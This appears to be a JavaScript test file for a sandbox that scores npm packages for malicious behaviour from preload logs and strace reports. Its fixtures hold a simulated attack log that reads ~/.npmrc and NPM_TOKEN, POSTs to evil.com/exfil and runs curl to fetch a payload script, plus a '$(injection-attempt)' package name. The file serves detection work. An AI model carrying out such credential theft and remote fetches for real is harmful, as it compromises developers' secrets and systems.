const fs = require('fs');
const path = require('path');
const {
  test, asyncTest, assert, assertIncludes,
  addSkipped
} = require('../test-utils');

async function runSandboxPreloadTests() {
  console.log('\n=== SANDBOX PRELOAD INTEGRATION TESTS ===\n');

  const {
    isDockerAvailable,
    imageExists,
    runSandbox,
    runSingleSandbox,
    scoreFindings,
    analyzePreloadLog,
    TIME_OFFSETS
  } = require('../../src/sandbox/index.js');

  // ── Non-Docker tests (always run) ──

  test('SANDBOX-PRELOAD: runSandbox returns all_runs array when Docker unavailable', () => {
    // When Docker is unavailable, runSandbox returns cleanResult without all_runs
    // This is expected — all_runs is only set when multi-run actually executes
    const dockerAvailable = isDockerAvailable();
    if (!dockerAvailable) {
      addSkipped('Docker not available — skipping multi-run structure test');
      return;
    }
    // If Docker IS available, we just verify the types exist
    assert(typeof runSandbox === 'function', 'runSandbox should be a function');
    assert(typeof runSingleSandbox === 'function', 'runSingleSandbox should be a function');
  });

  test('SANDBOX-PRELOAD: analyzePreloadLog scores combined timer + network attack', () => {
    const log =
      '[PRELOAD] INIT: Preload active. TIME_OFFSET=259200000ms (72.0h). PID=1 (t+0ms)\n' +
      '[PRELOAD] TIME: Time offset applied: +259200000ms (72.0h) (t+0ms)\n' +
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+10ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc (t+20ms)\n' +
      '[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+30ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/exfil (t+40ms)\n' +
      '[PRELOAD] EXEC: DANGEROUS execSync: curl http://evil.com/payload.sh (t+50ms)\n';
    const result = analyzePreloadLog(log);
    // 30 (critical timer) + 20 (sensitive read) + 40 (network after read) + 25 (exec) + 10 (env) = 125 -> 100
    assert(result.score === 100, 'Full attack should score 100, got ' + result.score);
    assert(result.findings.length === 5, 'Should have 5 findings, got ' + result.findings.length);
  });

  test('SANDBOX-PRELOAD: scoreFindings + analyzePreloadLog combined scoring', () => {
    // Simulate what happens in runSingleSandbox: scoreFindings on report + analyzePreloadLog on preload_log
    const report = {
      network: { dns_queries: ['evil.com'] },
      preload_log: '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+10ms)\n'
    };
    const { score: straceSCore, findings: straceFindings } = scoreFindings(report);
    const preloadResult = analyzePreloadLog(report.preload_log);
    const combinedScore = Math.min(100, straceSCore + preloadResult.score);
    const allFindings = [...straceFindings, ...preloadResult.findings];

    assert(straceSCore === 20, 'strace score should be 20 for evil.com DNS');
    assert(preloadResult.score === 30, 'preload score should be 30 for 72h timer');
    assert(combinedScore === 50, 'Combined should be 50, got ' + combinedScore);
    assert(allFindings.length === 2, 'Should have 2 total findings');
  });

  test('SANDBOX-PRELOAD: TIME_OFFSETS cover immediate, 72h, 7d', () => {
    assert(TIME_OFFSETS.length === 3, 'Should have 3 offsets');
    assert(TIME_OFFSETS[0].offset === 0, 'First = 0 (immediate)');
    assert(TIME_OFFSETS[1].offset === 72 * 3600000, 'Second = 72h');
    assert(TIME_OFFSETS[2].offset === 7 * 24 * 3600000, 'Third = 7d');
  });

  await asyncTest('SANDBOX-PRELOAD: runSandbox with invalid package returns clean', async () => {
    const origLog = console.log;
    console.log = () => {};
    try {
      const result = await runSandbox('$(injection-attempt)', {});
      assert(result.score === 0, 'Invalid package should return score 0');
      assert(result.severity === 'CLEAN', 'Should be CLEAN');
    } finally {
      console.log = origLog;
    }
  });

  await asyncTest('SANDBOX-PRELOAD: runSandbox without Docker returns clean result', async () => {
    const origLog = console.log;
    console.log = () => {};
    try {
      const result = await runSandbox('lodash', {});
      assert(typeof result === 'object', 'Should return an object');
      assert(typeof result.score === 'number', 'Should have a score');
      assert(Array.isArray(result.findings), 'Should have findings array');
    } finally {
      console.log = origLog;
    }
  });

  // ── Docker-dependent tests (skip if unavailable) ──

  if (!isDockerAvailable()) {
    addSkipped('Docker not available — skipping Docker-dependent sandbox preload tests');
    return;
  }

  if (!imageExists()) {
    addSkipped('Sandbox Docker image not built — skipping Docker-dependent sandbox preload tests');
    return;
  }

  // These tests would run a real sandbox container — only on CI or dev machines with Docker
  await asyncTest('SANDBOX-PRELOAD: runSandbox returns result with all_runs', async () => {
    const origLog = console.log;
    const logs = [];
    console.log = (msg) => logs.push(msg);
    try {
      const result = await runSandbox('is-number', { canary: false });
      assert(typeof result === 'object', 'Should return an object');
      assert(typeof result.score === 'number', 'Should have a score');
      if (result.all_runs) {
        assert(Array.isArray(result.all_runs), 'all_runs should be an array');
        assert(result.all_runs.length >= 1, 'Should have at least 1 run');
        for (const run of result.all_runs) {
          assert(typeof run.run === 'number', 'Run should have run number');
          assert(typeof run.label === 'string', 'Run should have label');
          assert(typeof run.score === 'number', 'Run should have score');
        }
      }
    } finally {
      console.log = origLog;
    }
  });
}

module.exports = { runSandboxPreloadTests };
